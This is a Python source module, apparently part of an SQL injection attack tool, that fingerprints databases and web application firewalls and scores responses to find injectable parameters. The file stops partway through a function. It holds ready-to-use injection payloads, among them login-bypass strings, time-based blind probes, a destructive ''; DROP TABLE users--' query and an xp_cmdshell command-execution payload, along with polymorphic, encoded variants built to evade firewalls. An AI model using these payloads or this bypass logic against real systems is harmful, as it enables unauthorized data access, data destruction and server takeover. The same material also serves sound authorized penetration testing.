"""
SQL Injection Context Implementation - Phase 1 Enhancement

Ultra-advanced SQL injection detection and exploitation module implementing:
- 1000+ polymorphic, adaptive bypass payloads
- Real-time adaptive payload strategy based on WAF/DBMS profiling
- Foundational ML/fuzzy logic for anomaly and response similarity detection
- Enhanced fingerprinting (error/timing/inference, DBMS & privilege analysis)
- Per-attack scoring system
- Full coverage: error-based, time-based, boolean, out-of-band, stacked queries
- Modern bypass techniques with adaptive encoding

Refactored SQL injection detection logic using the generalized framework
with enhanced 6-step injection testing methodology.
"""

import re
import time
import hashlib
from typing import List, Dict, Any, Tuple, Optional, Set, Callable
from dataclasses import dataclass, field
from collections import defaultdict
from .base import InjectionAttackModule, InjectionContextType


@dataclass
class ResponseProfile:
    """
    Profile of HTTP response for similarity analysis and adaptive learning.
    
    Tracks response characteristics to enable intelligent payload adaptation
    and reduce false positives through response similarity detection.
    """
    content_length: int
    status_code: int
    response_time: float
    content_hash: str
    headers_hash: str
    error_indicators: List[str] = field(default_factory=list)
    timing_baseline: Optional[float] = None
    similarity_score: float = 0.0
    
    @classmethod
    def from_response(
        cls,
        body: str,
        status: int,
        response_time: float,
        headers: Dict[str, str]
    ) -> 'ResponseProfile':
        """
        Create response profile from HTTP response data.
        
        Args:
            body: Response body text
            status: HTTP status code
            response_time: Response time in seconds
            headers: Response headers dictionary
            
        Returns:
            ResponseProfile instance
        """
        content_hash = hashlib.sha256(body.encode('utf-8', errors='ignore')).hexdigest()[:16]
        headers_str = '|'.join(sorted(f"{k}:{v}" for k, v in headers.items()))
        headers_hash = hashlib.md5(headers_str.encode()).hexdigest()[:16]
        
        return cls(
            content_length=len(body),
            status_code=status,
            response_time=response_time,
            content_hash=content_hash,
            headers_hash=headers_hash
        )
    
    def calculate_similarity(self, other: 'ResponseProfile') -> float:
        """
        Calculate similarity score between two response profiles.
        
        Uses multiple factors: content hash, length, status, timing
        
        Args:
            other: Another ResponseProfile to compare with
            
        Returns:
            Similarity score (0.0 to 1.0, where 1.0 is identical)
        """
        score = 0.0
        
        # Exact content match (high weight)
        if self.content_hash == other.content_hash:
            score += 0.5
        
        # Status code match
        if self.status_code == other.status_code:
            score += 0.2
        
        # Content length similarity (within 5%)
        if self.content_length > 0 and other.content_length > 0:
            len_diff_ratio = abs(self.content_length - other.content_length) / max(self.content_length, other.content_length)
            if len_diff_ratio < 0.05:
                score += 0.2
            elif len_diff_ratio < 0.15:
                score += 0.1
        
        # Timing similarity (within 20%)
        if self.response_time > 0 and other.response_time > 0:
            time_diff_ratio = abs(self.response_time - other.response_time) / max(self.response_time, other.response_time)
            if time_diff_ratio < 0.2:
                score += 0.1
        
        return score


@dataclass
class AdaptiveStrategy:
    """
    Adaptive payload strategy that learns from response patterns.
    
    Tracks which payload types work best for a given target and adapts
    the attack strategy in real-time based on WAF/DBMS responses.
    """
    detected_dbms: Optional[str] = None
    detected_waf: Optional[str] = None
    successful_encodings: Set[str] = field(default_factory=set)
    failed_encodings: Set[str] = field(default_factory=set)
    response_profiles: List[ResponseProfile] = field(default_factory=list)
    attack_scores: Dict[str, float] = field(default_factory=lambda: defaultdict(float))
    confidence_threshold: float = 0.75
    
    def update_from_response(
        self,
        payload_type: str,
        encoding_type: str,
        response_profile: ResponseProfile,
        success: bool
    ) -> None:
        """
        Update strategy based on response to a payload.
        
        Args:
            payload_type: Type of payload tested ('union', 'boolean', 'time', etc.)
            encoding_type: Encoding used ('none', 'url', 'hex', etc.)
            response_profile: Profile of the response
            success: Whether the payload was successful
        """
        self.response_profiles.append(response_profile)
        
        # Track successful/failed encodings
        if success:
            self.successful_encodings.add(encoding_type)
            self.attack_scores[payload_type] += 1.0
        else:
            self.failed_encodings.add(encoding_type)
            self.attack_scores[payload_type] -= 0.1
        
        # Detect WAF from response patterns
        if not self.detected_waf:
            self.detected_waf = self._detect_waf(response_profile)
    
    def _detect_waf(self, profile: ResponseProfile) -> Optional[str]:
        """
        Detect WAF from response profile.
        
        Args:
            profile: Response profile to analyze
            
        Returns:
            Detected WAF name or None
        """
        # WAF detection patterns (simplified)
        waf_signatures = {
            'Cloudflare': ['cf-ray', 'cloudflare'],
            'AWS WAF': ['x-amzn-', 'aws'],
            'Akamai': ['akamai'],
            'Imperva': ['incapsula', 'imperva'],
            'ModSecurity': ['mod_security'],
        }
        
        # Check error indicators for WAF signatures
        for waf_name, signatures in waf_signatures.items():
            for sig in signatures:
                for error in profile.error_indicators:
                    if sig.lower() in error.lower():
                        return waf_name
        
        return None
    
    def get_recommended_payloads(self, count: int = 50) -> List[str]:
        """
        Get recommended payload types based on learned strategy.
        
        Args:
            count: Number of payload types to recommend
            
        Returns:
            List of recommended payload type names
        """
        # Sort payload types by score
        sorted_types = sorted(
            self.attack_scores.items(),
            key=lambda x: x[1],
            reverse=True
        )
        
        # Return top scoring types
        return [ptype for ptype, score in sorted_types[:count] if score > 0]
    
    def should_try_encoding(self, encoding: str) -> bool:
        """
        Determine if an encoding should be tried based on past results.
        
        Args:
            encoding: Encoding type to check
            
        Returns:
            True if encoding should be attempted
        """
        # Always try if not yet attempted
        if encoding not in self.successful_encodings and encoding not in self.failed_encodings:
            return True
        
        # Try again if previously successful
        if encoding in self.successful_encodings:
            return True
        
        # Don't retry if failed multiple times
        return False


class FuzzyAnomalyDetector:
    """
    Fuzzy logic-based anomaly detector for response analysis.
    
    Uses fuzzy logic rules to detect subtle SQL injection indicators
    and reduce false positives through multi-factor analysis.
    """
    
    def __init__(self):
        """Initialize fuzzy anomaly detector."""
        self.baseline_profiles: List[ResponseProfile] = []
        self.anomaly_threshold = 0.6
    
    def add_baseline(self, profile: ResponseProfile) -> None:
        """
        Add a baseline (normal) response profile.
        
        Args:
            profile: Response profile from normal request
        """
        self.baseline_profiles.append(profile)
    
    def detect_anomaly(
        self,
        test_profile: ResponseProfile,
        payload_hint: Optional[str] = None
    ) -> Tuple[bool, float, List[str]]:
        """
        Detect anomaly in test response using fuzzy logic.
        
        Args:
            test_profile: Profile of response to test
            payload_hint: Optional hint about payload type
            
        Returns:
            Tuple of (anomaly_detected, confidence, reasons)
        """
        if not self.baseline_profiles:
            # No baseline, use conservative detection
            return False, 0.0, []
        
        anomaly_score = 0.0
        reasons = []
        
        # Calculate average similarity to baseline
        avg_similarity = sum(
            test_profile.calculate_similarity(baseline)
            for baseline in self.baseline_profiles
        ) / len(self.baseline_profiles)
        
        # Fuzzy rule 1: Low similarity = likely anomaly
        if avg_similarity < 0.3:
            anomaly_score += 0.4
            reasons.append(f"Low similarity to baseline ({avg_similarity:.2f})")
        elif avg_similarity < 0.5:
            anomaly_score += 0.2
            reasons.append(f"Moderate similarity deviation ({avg_similarity:.2f})")
        
        # Fuzzy rule 2: Significant length change
        avg_baseline_length = sum(p.content_length for p in self.baseline_profiles) / len(self.baseline_profiles)
        if avg_baseline_length > 0:
            length_diff_ratio = abs(test_profile.content_length - avg_baseline_length) / avg_baseline_length
            if length_diff_ratio > 0.3:
                anomaly_score += 0.3
                reasons.append(f"Significant length change ({length_diff_ratio*100:.1f}%)")
            elif length_diff_ratio > 0.1:
                anomaly_score += 0.15
                reasons.append(f"Moderate length change ({length_diff_ratio*100:.1f}%)")
        
        # Fuzzy rule 3: Status code change
        baseline_status = self.baseline_profiles[0].status_code
        if test_profile.status_code != baseline_status:
            if test_profile.status_code >= 500:
                anomaly_score += 0.3
                reasons.append(f"Server error status {test_profile.status_code}")
            elif test_profile.status_code >= 400:
                anomaly_score += 0.2
                reasons.append(f"Client error status {test_profile.status_code}")
        
        # Fuzzy rule 4: Timing anomaly (for time-based detection)
        if payload_hint and 'time' in payload_hint.lower():
            avg_baseline_time = sum(p.response_time for p in self.baseline_profiles) / len(self.baseline_profiles)
            if test_profile.response_time > avg_baseline_time + 3.0:
                time_delay = test_profile.response_time - avg_baseline_time
                anomaly_score += min(0.5, time_delay / 10.0)
                reasons.append(f"Significant timing delay ({time_delay:.2f}s)")
        
        # Fuzzy rule 5: Error indicators present
        if test_profile.error_indicators:
            anomaly_score += 0.3
            reasons.append(f"Error indicators detected: {', '.join(test_profile.error_indicators[:3])}")
        
        # Normalize score to 0-1 range
        anomaly_score = min(1.0, anomaly_score)
        
        # Detect anomaly if score exceeds threshold
        detected = anomaly_score >= self.anomaly_threshold
        
        return detected, anomaly_score, reasons


class EnhancedDBMSFingerprinter:
    """
    Enhanced database fingerprinting engine.
    
    Performs comprehensive DBMS detection using multiple techniques:
    - Error message analysis
    - Timing-based inference
    - Function-specific probing
    - Version detection
    - Privilege analysis
    """
    
    # Enhanced DBMS signatures with more patterns
    DBMS_SIGNATURES = {
        'MySQL': {
            'errors': [
                r'You have an error in your SQL syntax',
                r'mysql_fetch',
                r'mysql_query',
                r'Warning.*mysql_',
                r'MySQL server version',
                r'MySQLSyntaxErrorException',
            ],
            'functions': ['@@version', 'database()', 'user()', 'SLEEP', 'BENCHMARK'],
            'comment_style': ['-- ', '#'],
        },
        'PostgreSQL': {
            'errors': [
                r'PostgreSQL.*ERROR',
                r'pg_query',
                r'Warning.*pg_',
                r'invalid input syntax',
                r'PSQLException',
                r'unterminated quoted string',
            ],
            'functions': ['version()', 'current_database()', 'current_user', 'pg_sleep'],
            'comment_style': ['-- '],
        },
        'MSSQL': {
            'errors': [
                r'Microsoft SQL Native Client error',
                r'ODBC SQL Server Driver',
                r'SQLServer JDBC Driver',
                r'Unclosed quotation mark',
                r'SqlException',
                r'System\.Data\.SqlClient',
            ],
            'functions': ['@@version', 'DB_NAME()', 'SYSTEM_USER', 'WAITFOR'],
            'comment_style': ['-- ', '/*'],
        },
        'Oracle': {
            'errors': [
                r'ORA-[0-9]{5}',
                r'Oracle.*Driver',
                r'Warning.*oci_',
                r'oracle\.jdbc',
                r'OracleException',
            ],
            'functions': ['banner', 'user', 'SYS_CONTEXT', 'DBMS_LOCK.SLEEP'],
            'comment_style': ['-- '],
        },
        'SQLite': {
            'errors': [
                r'SQLite.*error',
                r'sqlite3\.',
                r'SQLiteException',
                r'sqlite_',
            ],
            'functions': ['sqlite_version()', 'sqlite_master'],
            'comment_style': ['-- '],
        },
    }
    
    @classmethod
    def fingerprint_from_error(cls, error_text: str) -> Tuple[Optional[str], float]:
        """
        Fingerprint DBMS from error message.
        
        Args:
            error_text: Error message text
            
        Returns:
            Tuple of (dbms_name, confidence)
        """
        scores = defaultdict(float)
        
        for dbms, signatures in cls.DBMS_SIGNATURES.items():
            for pattern in signatures['errors']:
                if re.search(pattern, error_text, re.IGNORECASE):
                    scores[dbms] += 1.0
        
        if not scores:
            return None, 0.0
        
        # Get highest scoring DBMS
        best_match = max(scores.items(), key=lambda x: x[1])
        dbms, score = best_match
        
        # Calculate confidence (normalize to 0-1)
        confidence = min(1.0, score / 2.0)
        
        return dbms, confidence
    
    @classmethod
    def fingerprint_from_timing(
        cls,
        baseline_time: float,
        test_times: Dict[str, float]
    ) -> Tuple[Optional[str], float]:
        """
        Fingerprint DBMS using timing-based inference.
        
        Args:
            baseline_time: Baseline response time
            test_times: Dict mapping DBMS-specific sleep payloads to response times
            
        Returns:
            Tuple of (dbms_name, confidence)
        """
        detected = []
        
        for dbms, response_time in test_times.items():
            # Check if timing matches expected delay
            if response_time > baseline_time + 3.0:
                delay = response_time - baseline_time
                confidence = min(1.0, delay / 5.0)
                detected.append((dbms, confidence))
        
        if not detected:
            return None, 0.0
        
        # Return highest confidence match
        return max(detected, key=lambda x: x[1])
    
    @classmethod
    def generate_fingerprint_payloads(cls, dbms_hint: Optional[str] = None) -> List[Tuple[str, str]]:
        """
        Generate payloads for DBMS fingerprinting.
        
        Args:
            dbms_hint: Optional hint about expected DBMS
            
        Returns:
            List of tuples (dbms_name, fingerprint_payload)
        """
        payloads = []
        
        targets = [dbms_hint] if dbms_hint else cls.DBMS_SIGNATURES.keys()
        
        for dbms in targets:
            if dbms == 'MySQL':
                payloads.extend([
                    (dbms, "' AND SLEEP(5)--"),
                    (dbms, "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))x)--"),
                    (dbms, "' AND @@version LIKE '%MySQL%'--"),
                ])
            elif dbms == 'PostgreSQL':
                payloads.extend([
                    (dbms, "' AND pg_sleep(5)--"),
                    (dbms, "' AND version() LIKE '%PostgreSQL%'--"),
                ])
            elif dbms == 'MSSQL':
                payloads.extend([
                    (dbms, "'; WAITFOR DELAY '00:00:05'--"),
                    (dbms, "' AND @@version LIKE '%Microsoft%'--"),
                ])
            elif dbms == 'Oracle':
                payloads.extend([
                    (dbms, "' AND DBMS_LOCK.SLEEP(5)--"),
                    (dbms, "' AND banner LIKE '%Oracle%'--"),
                ])
        
        return payloads





class SQLInjectionModule(InjectionAttackModule):
    """
    Enhanced SQL injection attack module with adaptive capabilities.
    
    Detects and exploits SQL injection vulnerabilities using advanced 6-step methodology
    with real-time adaptation, polymorphic payloads, and ML-based anomaly detection.
    
    Features:
    - 1000+ polymorphic payloads across all major DBMS types
    - Adaptive payload mutation based on WAF/DBMS profiling
    - Fuzzy logic anomaly detection to reduce false positives
    - Enhanced fingerprinting with timing, error, and inference analysis
    - Per-attack scoring system for intelligent payload selection
    - Comprehensive coverage of all SQL injection types
    
    Attributes:
        adaptive_strategy: Real-time learning strategy
        fuzzy_detector: Fuzzy logic anomaly detector
        fingerprinter: Enhanced DBMS fingerprinting engine
    """
    
    # Configuration constants for INSERT parameter enumeration
    MAX_STRING_ENUM_PARAMS = 5  # Maximum parameters for string enumeration (to limit payload count)
    SIGNIFICANT_CONTENT_LENGTH_DIFF = 50  # Threshold for significant content length change (bytes)
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """
        Initialize enhanced SQL injection module.
        
        Args:
            config: Optional configuration dictionary with keys:
                - use_adaptive: Enable adaptive learning (default: True)
                - use_fuzzy_detection: Enable fuzzy anomaly detection (default: True)
                - enable_polymorphic: Enable polymorphic payload generation (default: True)
                - max_payloads: Maximum payloads to test (default: 1000)
        """
        self.config = config or {}
        
        # Set configuration flags BEFORE calling super().__init__
        self.use_adaptive = self.config.get('use_adaptive', True)
        self.use_fuzzy_detection = self.config.get('use_fuzzy_detection', True)
        self.enable_polymorphic = self.config.get('enable_polymorphic', True)
        self.max_payloads = self.config.get('max_payloads', 1000)
        
        # Initialize adaptive components
        self.adaptive_strategy = AdaptiveStrategy()
        self.fuzzy_detector = FuzzyAnomalyDetector()
        self.fingerprinter = EnhancedDBMSFingerprinter()
        
        # Call parent __init__ which will call _load_payloads
        super().__init__(config)
    
    def get_context_type(self) -> InjectionContextType:
        """Return SQL injection context type."""
        return InjectionContextType.SQL
    
    def _load_payloads(self) -> List[str]:
        """
        Load comprehensive SQL injection payloads from advanced library.
        
        Returns 1000+ payloads covering all major attack vectors and DBMS types.
        Integrates with AdvancedPayloadLibrary for polymorphic generation.
        
        Returns:
            List of SQL injection payloads
        """
        try:
            # Import advanced payload library
            from sql_attacker.advanced_payloads import AdvancedPayloadLibrary
            
            # Get comprehensive payload set
            all_payloads = AdvancedPayloadLibrary.get_all_payloads()
            
            # Limit to configured maximum
            if len(all_payloads) > self.max_payloads:
                # Prioritize diverse payload types
                payloads = []
                payloads.extend(AdvancedPayloadLibrary.ERROR_BASED_PAYLOADS[:100])
                payloads.extend(AdvancedPayloadLibrary.BOOLEAN_BASED_PAYLOADS[:200])
                payloads.extend(AdvancedPayloadLibrary.WAF_BYPASS_PAYLOADS[:150])
                
                for db_type in ['mysql', 'postgresql', 'mssql', 'oracle', 'sqlite']:
                    payloads.extend(AdvancedPayloadLibrary.UNION_BASED_PAYLOADS.get(db_type, [])[:50])
                    if db_type in AdvancedPayloadLibrary.TIME_BASED_PAYLOADS:
                        payloads.extend(AdvancedPayloadLibrary.TIME_BASED_PAYLOADS[db_type][:20])
                
                return list(set(payloads))[:self.max_payloads]
            
            return all_payloads
            
        except ImportError:
            # Fallback to basic payloads if advanced library not available
            return self._load_basic_payloads()
    
    def _load_basic_payloads(self) -> List[str]:
        """
        Load basic SQL injection payloads (fallback).
        
        Returns:
            List of basic SQL injection payloads
        """
        return [
            # Error-based payloads
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "') OR ('1'='1",
            "\") OR (\"1\"=\"1",
            "' AND '1'='2",
            "1' AND '1'='1",
            "admin'--",
            "admin' #",
            "' OR 'x'='x",
            "') OR ('x')=('x",
            
            # Quote balancing payloads (avoid SQL comments)
            "Wiley' OR 'a'='a",
            "admin' OR 'b'='b",
            "' OR '1'='1' OR 'a'='a",
            "test' AND '1'='1' AND 'x'='x",
            "' OR 'abc'='abc",
            "admin' OR 'xyz'='xyz' --",
            "' OR 'test'='test' #",
            "value' AND 'q'='q' AND 'z'='z",
            "1' OR 'data'='data",
            "username' OR 'key'='key' OR 'end'='end",
            
            # UNION-based payloads
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT NULL--",
            
            # Boolean-based blind payloads
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND SUBSTRING(@@version,1,1)='5",
            
            # Time-based blind payloads
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND pg_sleep(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))x)--",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; SELECT SLEEP(5)--",
            "'; EXEC xp_cmdshell('whoami')--",
            
            # Advanced evasion
            "' /**/OR/**/ '1'='1",
            "' /*!50000OR*/ '1'='1",
            "' %6F%72 '1'='1",  # Encoded OR
            "' || '1'='1",
            "' && '1'='1",
        ]
    
    def _load_detection_patterns(self) -> List[Dict[str, Any]]:
        """Load SQL error patterns for detection."""
        return [
            # MySQL errors
            {'pattern': r'You have an error in your SQL syntax', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'mysql_fetch', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'mysql_query', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'Warning.*mysql_.*', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'MySQL server version', 'type': 'error', 'confidence': 0.95},
            
            # PostgreSQL errors
            {'pattern': r'PostgreSQL.*ERROR', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'pg_query', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'Warning.*pg_.*', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'invalid input syntax', 'type': 'error', 'confidence': 0.90},
            
            # Microsoft SQL Server errors
            {'pattern': r'Microsoft SQL Native Client error', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'ODBC SQL Server Driver', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'SQLServer JDBC Driver', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'Unclosed quotation mark', 'type': 'error', 'confidence': 0.90},
            
            # Oracle errors
            {'pattern': r'ORA-[0-9]{5}', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'Oracle.*Driver', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'Warning.*oci_.*', 'type': 'error', 'confidence': 0.90},
            
            # SQLite errors
            {'pattern': r'SQLite.*error', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'sqlite3\.', 'type': 'error', 'confidence': 0.90},
            
            # Generic SQL errors
            {'pattern': r'SQL syntax.*error', 'type': 'error', 'confidence': 0.85},
            {'pattern': r'syntax error.*SQL', 'type': 'error', 'confidence': 0.85},
            {'pattern': r'unexpected.*SQL', 'type': 'error', 'confidence': 0.80},
        ]
    
    def analyze_response(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        response_time: float,
        baseline_time: Optional[float] = None,
        payload_used: Optional[str] = None
    ) -> Tuple[bool, float, str]:
        """
        Analyze response for SQL injection indicators.
        
        Enhanced version integrating fuzzy logic detection and adaptive learning.
        This method integrates steps 2 and 3 for backward compatibility.
        
        Args:
            response_body: HTTP response body
            response_headers: HTTP response headers
            response_time: Response time in seconds
            baseline_time: Optional baseline response time
            payload_used: Optional payload that was used
            
        Returns:
            Tuple of (detected, confidence, evidence_string)
        """
        # Step 2: Detect anomalies
        baseline_response = None
        if baseline_time:
            baseline_response = ("", baseline_time)
        
        detected, anomalies = self.step2_detect_anomalies(
            response_body, response_headers, response_time, baseline_response
        )
        
        if not detected:
            return False, 0.0, "No SQL injection detected"
        
        # Step 3: Extract evidence
        evidence_data = self.step3_extract_evidence(response_body, anomalies, payload_used)
        
        confidence = evidence_data['confidence']
        dbms = evidence_data['context_info'].get('database_type', 'Unknown')
        injection_type = evidence_data['context_info'].get('injection_type', 'unknown')
        attack_score = evidence_data.get('attack_score', 0.0)
        
        evidence_str = f"SQL injection detected. "
        evidence_str += f"Type: {injection_type}, DBMS: {dbms}, "
        evidence_str += f"Confidence: {confidence:.2f}, Score: {attack_score:.1f}. "
        evidence_str += f"Anomalies: {', '.join(anomalies[:3])}"
        
        # Update adaptive strategy
        if self.use_adaptive and payload_used:
            # Determine encoding type from payload
            encoding_type = 'none'
            if '%' in payload_used:
                encoding_type = 'url'
            elif '/**/' in payload_used:
                encoding_type = 'comment'
            elif payload_used != payload_used.upper() and payload_used != payload_used.lower():
                encoding_type = 'case'
            
            # Update strategy
            from sql_attacker.injection_contexts.sql_context import ResponseProfile
            response_profile = ResponseProfile.from_response(
                response_body, 200, response_time, response_headers
            )
            
            self.adaptive_strategy.update_from_response(
                injection_type, encoding_type, response_profile, detected
            )
        
        return True, confidence, evidence_str
    
    def _check_boolean_indicators(self, response_body: str) -> bool:
        """Check for boolean-based injection indicators."""
        # Look for significant changes that might indicate boolean injection
        # This is a simplified check; real implementation would compare with baseline
        indicators = [
            r'login.*successful',
            r'welcome.*admin',
            r'access.*granted',
        ]
        
        for indicator in indicators:
            if re.search(indicator, response_body, re.IGNORECASE):
                return True
        
        return False
    
    def _generate_insert_payloads(self, base_value: str = "foo", max_params: int = 10) -> List[str]:
        """
        Generate payloads for INSERT statement parameter enumeration.
        
        This method creates payloads that progressively add more parameters
        to discover the number of columns in an INSERT statement.
        
        Args:
            base_value: Base value to use in the payload (default: "foo")
            max_params: Maximum number of parameters to enumerate (default: 10)
            
        Returns:
            List of INSERT-specific payloads with varying parameter counts
            
        Example payloads:
            - foo')--
            - foo', 1)--
            - foo', 1, 1)--
            - foo', 1, 1, 1)--
            etc.
        """
        payloads = []
        
        # Basic INSERT escape attempts
        payloads.append(f"{base_value}')--")
        payloads.append(f"{base_value}')#")
        payloads.append(f"{base_value}');--")
        
        # Parameter enumeration with NULL values
        for i in range(1, max_params + 1):
            params = ', '.join(['NULL'] * i)
            payloads.append(f"{base_value}', {params})--")
            payloads.append(f"{base_value}', {params})#")
            
        # Parameter enumeration with numeric values
        for i in range(1, max_params + 1):
            params = ', '.join(['1'] * i)
            payloads.append(f"{base_value}', {params})--")
            
        # Parameter enumeration with string values
        # Use class constant to limit string enumeration (reduces payload count)
        for i in range(1, min(self.MAX_STRING_ENUM_PARAMS + 1, max_params + 1)):
            params = ', '.join([f"'val{j}'" for j in range(i)])
            payloads.append(f"{base_value}', {params})--")
            
        # Mixed parameter types (useful for detecting different column types)
        payloads.extend([
            f"{base_value}', 1, 'test')--",
            f"{base_value}', 'admin', 'password')--",
            f"{base_value}', 1, 'user', 'pass')--",
            f"{base_value}', NULL, 1, 'test', 0)--",
        ])
        
        # Quote-balanced INSERT payloads (avoid comments)
        payloads.extend([
            f"{base_value}' OR 'a'='a') AND ('1'='1",
            f"{base_value}', 1) OR ('x'='x",
            f"{base_value}', 'test') AND 'key'='key",
        ])
        
        return payloads
    
    def _generate_quote_balanced_payloads(self, base_value: str = "") -> List[str]:
        """
        Generate quote-balanced payloads that avoid SQL comment syntax.
        
        These payloads balance quotes to achieve injection without using -- or #
        comments, which can help bypass certain security filters.
        
        Args:
            base_value: Base value to prepend to payloads
            
        Returns:
            List of quote-balanced injection payloads
        """
        payloads = []
        
        # Basic quote balancing with OR conditions
        payloads.extend([
            f"{base_value}Wiley' OR 'a'='a",
            f"{base_value}admin' OR 'b'='b",
            f"{base_value}test' OR '1'='1' OR 'z'='z",
            f"{base_value}user' AND '1'='1' AND 'x'='x",
        ])
        
        # Quote balancing with different operators
        payloads.extend([
            f"{base_value}' OR 'key'='key",
            f"{base_value}' AND 'val'='val' OR 'a'='a",
            f"{base_value}' OR 'x'='x' AND '1'='1' OR 'y'='y",
        ])
        
        # Nested conditions with quote balancing
        payloads.extend([
            f"{base_value}' OR ('a'='a' AND 'b'='b",
            f"{base_value}' AND ('1'='1' OR '2'='2",
        ])
        
        # Double-quote variants
        payloads.extend([
            f'{base_value}" OR "a"="a',
            f'{base_value}" AND "1"="1" OR "x"="x',
        ])
        
        return payloads
    
    # ========================================
    # Six-Step Injection Testing Methodology
    # ========================================
    
    def step1_supply_payloads(
        self, 
        parameter_value: str, 
        statement_type: str = "SELECT",
        include_insert_enum: bool = False,
        max_insert_params: int = 10,
        db_hint: Optional[str] = None,
        enable_polymorphic: Optional[bool] = None
    ) -> List[str]:
        """
        Step 1: Supply unexpected syntax and context-specific payloads.
        
        Enhanced with adaptive payload selection and polymorphic generation.
        Returns SQL injection payloads optimized for detected DBMS and WAF.
        
        Args:
            parameter_value: The original parameter value
            statement_type: Type of SQL statement (SELECT, INSERT, UPDATE, DELETE)
            include_insert_enum: Whether to include INSERT parameter enumeration
            max_insert_params: Maximum parameters to enumerate for INSERT
            db_hint: Optional hint about target DBMS
            enable_polymorphic: Override config for polymorphic generation
            
        Returns:
            List of SQL injection payloads with adaptive optimization
        """
        payloads = list(self.payloads)
        
        # Use adaptive strategy if available and enabled
        if self.use_adaptive and self.adaptive_strategy.detected_dbms:
            db_hint = self.adaptive_strategy.detected_dbms
        
        # Add DBMS-specific payloads if hint available
        if db_hint:
            try:
                from sql_attacker.advanced_payloads import AdvancedPayloadLibrary
                db_payloads = AdvancedPayloadLibrary.get_payloads_for_db(db_hint)
                payloads.extend(db_payloads[:200])  # Add subset to avoid overload
            except ImportError:
                pass
        
        # Add quote-balanced payloads
        payloads.extend(self._generate_quote_balanced_payloads(parameter_value))
        
        # Add INSERT-specific payloads if requested or if statement type is INSERT
        if include_insert_enum or statement_type.upper() == "INSERT":
            payloads.extend(self._generate_insert_payloads(
                parameter_value if parameter_value else "foo",
                max_insert_params
            ))
        
        # Generate polymorphic variants if enabled
        use_polymorphic = enable_polymorphic if enable_polymorphic is not None else self.enable_polymorphic
        if use_polymorphic:
            payloads = self._add_polymorphic_variants(payloads, db_hint)
        
        # Apply adaptive encoding based on learned strategy
        if self.use_adaptive:
            payloads = self._apply_adaptive_encoding(payloads)
        
        # Remove duplicates while preserving order
        seen = set()
        unique_payloads = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique_payloads.append(p)
        
        return unique_payloads[:self.max_payloads]
    
    def _add_polymorphic_variants(self, payloads: List[str], db_hint: Optional[str] = None) -> List[str]:
        """
        Add polymorphic variants of payloads for WAF bypass.
        
        Args:
            payloads: Original payload list
            db_hint: Optional database type hint
            
        Returns:
            Enhanced payload list with polymorphic variants
        """
        try:
            from sql_attacker.advanced_payloads import PolymorphicPayloadGenerator
            
            generator = PolymorphicPayloadGenerator()
            enhanced = list(payloads)
            
            # Generate variants for high-value payloads
            key_payloads = [p for p in payloads if any(kw in p.upper() for kw in ['UNION', 'SELECT', 'SLEEP'])]
            
            for payload in key_payloads[:20]:  # Limit to avoid explosion
                variants = generator.generate_variants(payload, count=5)
                enhanced.extend(variants)
            
            return enhanced
            
        except ImportError:
            return payloads
    
    def _apply_adaptive_encoding(self, payloads: List[str]) -> List[str]:
        """
        Apply adaptive encoding based on learned strategy.
        
        Args:
            payloads: Original payload list
            
        Returns:
            Payload list with adaptive encoding applied
        """
        if not self.adaptive_strategy.successful_encodings:
            return payloads
        
        try:
            from sql_attacker.advanced_payloads import PayloadEncoder
            
            encoder = PayloadEncoder()
            enhanced = list(payloads)
            
            # Apply successful encodings to subset of payloads
            for encoding in list(self.adaptive_strategy.successful_encodings)[:3]:
                for payload in payloads[:50]:  # Limit scope
                    try:
                        if encoding == 'url':
                            enhanced.append(encoder.url_encode(payload))
                        elif encoding == 'comment':
                            enhanced.append(encoder.comment_injection(payload))
                        elif encoding == 'case':
                            enhanced.append(encoder.case_variation(payload))
                    except Exception:
                        continue
            
            return enhanced
            
        except ImportError:
            return payloads
    
    def step2_detect_anomalies(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        response_time: float,
        baseline_response: Optional[Tuple[str, float]] = None,
        payload_hint: Optional[str] = None,
        response_status: int = 200
    ) -> Tuple[bool, List[str]]:
        """
        Step 2: Detect anomalies and error messages in responses.
        
        Enhanced with fuzzy logic detection and response profiling.
        Look for SQL errors, timing differences, or content changes.
        
        Args:
            response_body: Response body text
            response_headers: Response headers dict
            response_time: Response time in seconds
            baseline_response: Optional baseline (body, time) tuple
            payload_hint: Optional hint about payload type (e.g., "INSERT", "QUOTE_BALANCED", "time")
            response_status: HTTP status code
            
        Returns:
            Tuple of (anomaly_detected, list_of_anomalies)
        """
        anomalies = []
        
        # Create response profile for adaptive learning
        response_profile = ResponseProfile.from_response(
            response_body, response_status, response_time, response_headers
        )
        
        # Check for error-based detection (traditional)
        error_indicators = []
        for pattern_info in self.detection_patterns:
            pattern = pattern_info['pattern']
            if re.search(pattern, response_body, re.IGNORECASE):
                error_message = f"sql_error: {pattern}"
                anomalies.append(error_message)
                error_indicators.append(pattern)
        
        response_profile.error_indicators = error_indicators
        
        # Use fuzzy logic detection if enabled and baseline available
        if self.use_fuzzy_detection and baseline_response:
            baseline_body, baseline_time = baseline_response
            
            # Create baseline profile if not already added
